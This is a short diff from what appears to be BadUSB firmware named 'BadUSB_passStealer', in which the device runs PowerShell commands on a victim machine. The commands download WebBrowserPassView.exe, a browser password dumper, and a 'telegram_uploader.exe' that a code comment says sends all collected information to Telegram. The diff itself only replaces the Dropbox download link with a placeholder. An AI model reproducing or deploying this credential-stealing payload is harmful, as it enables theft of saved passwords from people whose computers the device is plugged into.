@@ -66,7 +66,7 @@ void run() {
   runCommand("Invoke-WebRequest https://github.com/tuconnaisyouknow/BadUSB_passStealer/blob/main/other_files/WebBrowserPassView.exe?raw=true -OutFile WebBrowserPassView.exe");
 
   //Download uploader file to upload all informations on telegram
-  runCommand("Invoke-WebRequest \"https://www.dropbox.com/scl/fi/bokfx3c7zyhtewtrjacay/telegram_uploader.exe?rlkey=iti2b64uhwwbg62w7zqpvlr5k&dl=1\" -OutFile telegram_uploader.exe");
+  runCommand("Invoke-WebRequest \"https://www.dropbox.com/scl/fi/smthere/telegram_uploader.exe?rlkey=smthere&dl=1\" -OutFile telegram_uploader.exe");
 
   //Delay for downloading
   delay(3500);
